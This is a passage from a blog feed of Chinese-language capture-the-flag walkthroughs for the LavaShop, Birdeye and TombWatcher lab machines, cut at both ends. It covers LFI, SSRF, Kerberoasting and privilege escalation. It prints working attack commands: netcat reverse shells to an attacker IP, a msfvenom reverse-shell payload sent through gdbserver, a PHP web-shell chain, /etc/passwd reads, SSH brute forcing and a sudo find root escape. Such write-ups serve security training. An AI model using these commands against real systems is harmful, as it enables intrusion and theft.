5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms 192.168.56.129\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.38 seconds\n```\n\n### 枚举\n\n`80` 端口\n\n![image.png](/post-images/TheHackersLabsLavaShop/image1.png)\n\n1337 端口\n\n```python\n➜  LavaShop echo \"1234\" | nc 192.168.56.129 1337\n(UNKNOWN) [192.168.56.129] 1337 (?) : Connection refused\n```\n\n目录扫描\n\n```python\n➜  LavaShop feroxbuster --url http://lavashop.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt\n                                                                                                                  \n ___  ___  __   __     __      __         __   ___                                                                \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                 \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                \nby Ben \"epi\" Risher 🤓                 ver: 2.11.0                                                                \n───────────────────────────┬──────────────────────                                                                \n 🎯  Target Url            │ http://lavashop.thl                                                                  \n 🚀  Threads               │ 50                                             \n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      191l      466w     4025c http://lavashop.thl/assets/css/styles.css\n200      GET       45l      105w     1539c http://lavashop.thl/index.php\n301      GET        9l       28w      312c http://lavashop.thl/pages => http://lavashop.thl/pages/\n301      GET        9l       28w      313c http://lavashop.thl/assets => http://lavashop.thl/assets/\n301      GET        9l       28w      315c http://lavashop.thl/includes => http://lavashop.thl/includes/\n200      GET       45l      105w     1539c http://lavashop.thl/\n301      GET        9l       28w      320c http://lavashop.thl/assets/images => http://lavashop.thl/assets/images/\n301      GET        9l       28w      317c http://lavashop.thl/assets/css => http://lavashop.thl/assets/css/\n301      GET        9l       28w      321c http://lavashop.thl/includes/pages => http://lavashop.thl/includes/pages/\n200      GET       19l       40w      698c http://lavashop.thl/includes/header.php\n200      GET        8l       20w      424c http://lavashop.thl/includes/nav.php\n200      GET        5l       27w      208c http://lavashop.thl/pages/about.php\n200      GET       26l       97w     1017c http://lavashop.thl/pages/products.php\n200      GET        8l       23w      246c http://lavashop.thl/includes/pages/contact.php\n200      GET        4l        7w      139c http://lavashop.thl/pages/contact.php\n200      GET        5l       20w      195c http://lavashop.thl/pages/home.php\n200      GET        5l       14w      105c http://lavashop.thl/includes/footer.php\n200      GET        6l       26w      192c http://lavashop.thl/includes/pages/catalog.php\n200      GET        4l       30w      208c http://lavashop.thl/includes/pages/home.php\n```\n\n看着像是存在 LFI ，枚举一下 `index.php` 的 page 参数\n\n```python\n➜  LavaShop ffuf -u 'http://lavashop.thl/index.php?page=FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://lavashop.thl/index.php?page=FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\nabout                   [Status: 200, Size: 1268, Words: 140, Lines: 41, Duration: 0ms]\ncontact                 [Status: 200, Size: 1199, Words: 115, Lines: 40, Duration: 0ms]\nhome                    [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 0ms]\nproducts                [Status: 200, Size: 2077, Words: 296, Lines: 62, Duration: 0ms]\n                        [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 4ms]\n:: Progress: [74332/74332] :: Job [1/1] :: 8333 req/sec :: Duration: [0:00:08] :: Errors: 0 ::\n```\n\n没有枚举出来，再枚举一下其他页面是否存在参数\n\n有点阴了，藏在 `products.php`\n\n```python\n➜  LavaShop ffuf -u 'http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fs 1017\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 1017\n________________________________________________\n\nfile                    [Status: 200, Size: 2481, Words: 225, Lines: 55, Duration: 1ms]\n```\n\n成功包含\n\n```python\n➜  LavaShop curl 'http://lavashop.thl/pages/products.php?file=/etc/passwd'                \n  <section style=\"margin-bottom:1.5rem; padding:1rem; background:rgba(0,0,0,.25); border:1px solid rgba(255,255,255,.1); border-radius:12px;\">\n    <p style=\"margin:0 0 .75rem;\">Incluyendo: <code>/etc/passwd</code></p>\n    <pre style=\"white-space:pre-wrap; overflow:auto; padding:.75rem; background:rgba(0,0,0,.35); border-radius:8px;\">\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                   \nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync                                                                                \ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                   \nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\nsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\ndebian:x:1000:1000:debian,,,:/home/debian:/bin/bash\nRodri:x:1001:1001::/home/Rodri:/bin/bash\n```\n\n## LFI\n\n将用户 Rodri 拿去后台爆破\n\n```python\nLavaShop hydra -l Rodri -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.129 ssh\n```\n\n继续测试 LFI，可以使用伪协议\n\n![image.png](/post-images/TheHackersLabsLavaShop/image2.png)\n\n能直接读 user.txt\n\n![image.png](/post-images/TheHackersLabsLavaShop/image3.png)\n\n继续测试，尝试使用 https://github.com/synacktiv/php_filter_chain_generator\n\n```python\npython lfi.py --chain '<?php phpinfo();?>'\n```\n\n成功执行\n\n![image.png](/post-images/TheHackersLabsLavaShop/image4.png)\n\n反弹 `shell`\n\n```python\npython lfi.py --chain '<?php eval(system($_GET[\"x\"])); ?>  '  \n```\n\n![image.png](/post-images/TheHackersLabsLavaShop/image5.png)\n\n```python\nx=busybox nc 192.168.56.5 1234 -e /bin/bash\n```\n\n![image.png](/post-images/TheHackersLabsLavaShop/image6.png)\n\n## 提权 - Rodri\n\n查看进程可以看到后台有个 `gdbserver`\n\n![image.png](/post-images/TheHackersLabsLavaShop/image7.png)\n\n网上收集了几个 payload 这个能用：\n\n[渗透测试远程 GdbServer - HackTricks --- Pentesting Remote GdbServer - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver)\n\n```python\n# Trick shared by @B1n4rySh4d0w\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf\n\nchmod +x binary.elf\n\ngdb binary.elf\n\n# Set remote debuger target\ntarget extended-remote 192.168.56.129:1337\n\n# Upload elf file\nremote put binary.elf binary.elf\n\n# Set remote executable file\nset remote exec-file /home/Rodri/binary.elf\n\n# Execute reverse shell executable\nrun\n\n# You should get your reverse-shell\n```\n\n![image.png](/post-images/TheHackersLabsLavaShop/image8.png)\n\n## 提权\n\n`root` 密码藏在环境变量里面\n\n![image.png](/post-images/TheHackersLabsLavaShop/image9.png)",
            "url": "https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop",
            "title": "TheHackersLabs - LavaShop",
            "summary": "LavaShop https://labs.thehackerslabs.com/machine/140 Recon PortScan 枚举 80 端口 1337 端口 目录扫描 看着像是存在 LFI ，枚举一下 index.php 的 page 参数 没有枚举出来，再枚举一下其他页面是否存在参数 ...",
            "date_modified": "2025-10-20T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackerLabs",
                "Linux",
                "LFI",
                "Fuzz",
                "Gdbserver"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye",
            "content_html": "\n# Birdeye.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Birdeye\n> \n\n![image.png](/post-images/HackMyVMBirdeye/image.png)\n\n## Recon\n\n### PortScan\n\n```python\n➜  Birdeye nmap -sT -min-rate 10000 -p- 192.168.56.127\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 19:45 CST\nNmap scan report for 192.168.56.127\nHost is up (0.00027s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n5000/tcp open  upnp\nMAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.44 seconds\n```\n\n```python\n➜  Birdeye nmap -sT -A -p 53,80,5000 192.168.56.127                    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 20:02 CST\nNmap scan report for 192.168.56.127\nHost is up (0.00046s latency).\n\nPORT     STATE SERVICE VERSION\n53/tcp   open  domain  ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: client\n|_http-cors: GET POST OPTIONS\n5000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.6.9)\n|_http-title: 404 Not Found\n|_http-server-header: Werkzeug/2.0.3 Python/3.6.9\nMAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms 192.168.56.127\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 29.38 seconds\n```\n\n### 枚举\n\n80 端口的搜索时发的包很奇怪\n\n![image.png](/post-images/HackMyVMBirdeye/image1.png)\n\n看着存在 `SSRF`\n\n![image.png](/post-images/HackMyVMBirdeye/image2.png)\n\n改成 kali 的 IP 试试\n\n![image.png](/post-images/HackMyVMBirdeye/image3.png)\n\n存在 `SSRF`\n\n![image.png](/post-images/HackMyVMBirdeye/image4.png)\n\n并且原本后面的 URL 是：`http://localhost:5000/api/products/?search=\"\"`\n\n## SSRF\n\n利用 SSRF 漏洞进行枚举\n\n首先枚举内网端口\n\n```python\n➜  Birdeye ffuf -u 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/' -w port -fc 500\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/\n :: Wordlist         : FUZZ: /root/Desktop/HackMyVM/Birdeye/port\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 500\n________________________________________________\n\n80                      [Status: 200, Size: 288, Words: 38, Lines: 8, Duration: 106ms]\n:: Progress: [10000/10000] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:29] :: Errors: 0 ::\n```\n\n我们再根据原本`403` 的地址进行访问，例如：\n\n```python\n403      GET        1l        5w       32c http://192.168.56.127/admin/config\n401      GET        1l        1w       25c http://192.168.56.127/admin/dashboard\n```\n\n成功包含到账户密码，并且告诉我们 `/api/fetch-url` 支持 `GET, POST, OPTIONS` 三种方法\n\n```python\n➜  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1/admin/config'\nHTTP/1.1 200 OK\nDate: Fri, 17 Oct 2025 13:32:01 GMT\nServer: Werkzeug/2.0.3 Python/3.6.9\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\nContent-Type: application/json\nContent-Length: 106\nAccess-Control-Allow-Origin: *, *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\n\n{\"admin_password\":\"SuperSecret123!\",\"admin_user\":\"superadmin\",\"login_panel_path\":\"/admin/panelloginpage\"}\n```\n\n根据获取到内容访问后访问后台地址\n\n![image.png](/post-images/HackMyVMBirdeye/image5.png)\n\n我们有必要发送 POST 数据（这里看了下 WP，没想到是这样更换方法），所以接上 `curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST'`\n\n```python\n➜  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'admin_user=superadmin&admin_password=SuperSecret123!'\nHTTP/1.1 200 OK\nDate: Fri, 17 Oct 2025 13:35:48 GMT\nServer: Werkzeug/2.0.3 Python/3.6.9\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\nContent-Type: text/html; charset=utf-8\nContent-Length: 145\nAccess-Control-Allow-Origin: *, *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\nVary: Cookie,Accept-Encoding\nSet-Cookie: session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aPJGNA.-3-eVxjfstKta_I4ubREsK2pnAg; Domain=192.168.1.237; Path=/\n\n    <h2>Admin Dashboard</h2>\n    <form method=\"post\">\n        <label>Command: <input name=\"command\" type=\"text\"></label>\n        <button type=\"s#   \n```\n\n这样就拿到了 `Cookie` ，我们存储在 `http://192.168.56.127/admin/dashboard` 中\n\n![image.png](/post-images/HackMyVMBirdeye/image6.png)\n\n看样子是个命令执行的功能\n\n![image.png](/post-images/HackMyVMBirdeye/image7.png)\n\n进行反弹 `shell`\n\n```python\ncommand=busybox nc 192.168.56.5 1234 -e /bin/bash\n```\n\n## 提权 - sev\n\n查看 sudo 权限\n\n```python\nwww-data@birdeye:~/birdeye$ sudo -l\nMatching Defaults entries for www-data on birdeye:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on birdeye:\n    (sev) NOPASSWD: /home/sev/backup_app.sh\n```\n\n查看内容，直接给了\n\n```python\nwww-data@birdeye:~/birdeye$ cat /home/sev/backup_app.sh\n#!/bin/bash\n/bin/bash -p\n```\n\n切换到 sev\n\n```python\nwww-data@birdeye:~/birdeye$ sudo -u sev /home/sev/backup_app.sh \nsev@birdeye:~/birdeye$ \n```\n\n## 提权 - root\n\n```python\nsev@birdeye:~/birdeye$ sudo -l\nMatching Defaults entries for sev on birdeye:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sev may run the following commands on birdeye:\n    (ALL) NOPASSWD: /usr/bin/find\n```\n\n结束了\n\n```python\nsev@birdeye:~/birdeye$ sudo find . -exec /bin/sh \\; -quit\n# id\nuid=0(root) gid=0(root) groups=0(root\n```\n\n## 总结\n\n？",
            "url": "https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye",
            "title": "HackMyVM - Birdeye",
            "summary": "Birdeye. https://hackmyvm.eu/machines/machine.php?vm=Birdeye Recon PortScan 枚举 80 端口的搜索时发的包很奇怪 看着存在 SSRF 改成 kali 的 IP 试试 存在 SSRF 并且原本后面的 URL 是：http://...",
            "date_modified": "2025-10-17T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackMyVM",
                "Linux",
                "SSRF",
                "find"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher",
            "content_html": "\n# Season8 - TombWatcher\n\n> https://app.hackthebox.com/machines/TombWatcher | `Windows` | `Medium`\n> \n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image.png)\n\nMachine Information：As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!\n\n## Recon\n\n### 端口扫描\n\n`nmap` 端口扫描\n\n```bash\n➜  TombWatcher nmap -sT -min-rate 5000 10.10.11.72  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:01 CST\nNmap scan report for 10.10.11.72\nHost is up (0.059s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap done: 1 IP address (1 host up) scanned in 1.24 seconds\n```\n\n```bash\n➜  TombWatcher nmap -sT -A -p 53,80,88,135,139,389,445,464,5985 10.10.11.72                                       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:03 CST                                                   \nNmap scan report for 10.10.11.72                         \nHost is up (0.10s latency).    \n                                                         \nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0    \n|_http-server-header: Microsoft-IIS/10.0                                                                          \n| http-methods:                                                                                                   \n|_  Potentially risky methods: TRACE            \n|_http-title: IIS Windows Server    \n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-08 07:41:39Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.tombwatcher.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb\n| Not valid before: 2024-11-16T00:47:59\n|_Not valid after:  2025-11-16T00:47:59\n|_ssl-date: 2025-06-08T07:42:31+00:00; +3h38m21s from scanner time.\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-06-08T07:41:51\n|_  start_date: N/A\n|_clock-skew: mean: 3h38m20s, deviation: 0s, median: 3h38m20s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   85.41 ms  10.10.16.1\n2   128.13 ms 10.10.11.72\n```\n\n访问`HTTP`，是默认页\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image1.png)\n\n扫描了一波，没什么东西，重点应该不在这，因为给了凭据\n\n### 凭据测试 & 服务枚举\n\n使用 `nxc` 对凭据进行测试\n\n```bash\n➜  TombWatcher nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\n➜  TombWatcher nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nLDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nLDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\n➜  TombWatcher nxc wmi 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nRPC         10.10.11.72     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nRPC         10.10.11.72     135    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\n➜  TombWatcher nxc winrm 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nWINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nWINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\\henry:H3nry_987TGV!\n```\n\n```bash\n➜  TombWatcher wmiexec.py tombwatcher.htb/henry:'H3nry_987TGV!'@10.10.11.72 -dc-ip 10.10.11.72\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED\n```\n\n`SMB` 也是没什么信息\n\n```bash\n➜  TombWatcher smbclient -L 10.10.11.72 -U tombwatcher.htb/henry%'H3nry_987TGV!'\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n## 域分析 - 1\n\n```bash\n➜  TombWatcher bloodhound-python -u henry -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns 10.10.11.72 --zip -c All -dc 'DC01.tombwatcher.htb' --dns-tcp\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: tombwatcher.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.tombwatcher.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.tombwatcher.htb\nINFO: Found 12 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.tombwatcher.htb\nINFO: Done in 00M 12S\nINFO: Compressing output into 20250608163651_bloodhound.zip\n```\n\n`henry` 所属组权限\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image2.png)\n\n对`Alfred`有`writeSPN`权限\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image3.png)\n\n我们再看一下 `Alfred` 的权限\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image4.png)\n\n继续跟进`INFRASTRUCTURE` 组，能够读取机器`ANSIBLE_DEV`的`GMSA`密码\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image5.png)\n\n然后 `ANSIBLE_DEV` 能够更改 `SAM` 用户密码\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image6.png)\n\n并且 `SAM` 用户对 `JOHN`用户拥有 `genericAll`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image7.png)\n\n用户`John`的权限，是远程管理组的成员\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image8.png)\n\n## 域渗透\n\n### Kerberoasting\n\n> https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting\n> \n\n攻击者可以将 SPN （`ServicePrincipalName`） 添加到该帐户。一旦账户拥有 SPN，它就容易受到 `Kerberoast` 的攻击 。这种技术称为 `Targeted Kerberoasting`\n\n工具链接：https://github.com/ShutdownRepo/targetedKerberoast\n\n```bash\n➜  targetedKerberoast python targetedKerberoast.py -v -d tombwatcher.htb --dc-ip 10.10.11.72 -u henry -p 'H3nry_987TGV!'\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image9.png)\n\n使用`hashcat`进行爆破\n\n```bash\n➜  targetedKerberoast hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt \n```\n\n得到密码 `basketball`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image10.png)\n\n### ReadGMSAPassword\n\n测试`alfred`的凭据\n\n```bash\n➜  TombWatcher nxc smb 10.10.11.72 -u alfred -p 'basketball' -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\alfred:basketball \n```\n\n上边分析域的时候能知道`alfred`用户可以读取`ANSIBLE_DEV` 计算机的`GMSA`密码\n\n工具：https://github.com/micahvandeusen/gMSADumper\n\n```bash\n➜  gMSADumper python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb\nUsers or groups who can read password for ansible_dev$:\n > 